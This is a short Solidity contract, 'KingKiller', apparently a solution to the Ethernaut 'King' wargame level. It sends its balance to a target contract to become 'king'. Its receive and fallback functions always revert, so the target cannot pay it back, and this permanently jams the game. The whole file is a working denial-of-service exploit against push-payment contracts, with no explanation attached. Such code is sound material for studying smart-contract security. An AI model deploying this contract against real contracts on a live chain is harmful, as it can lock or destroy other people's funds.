// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract KingKiller {
    address payable kingContract;

    constructor(address payable _kingContract) payable {
        kingContract = _kingContract;
    }

    function takeTheThrone() public payable {
      (bool success, ) = kingContract.call{value: address(this).balance}("");
      require(success, "Transfer failed");
    }
    
    receive () external payable {
        revert();
    }

    fallback() external payable {
        revert();
    }

}
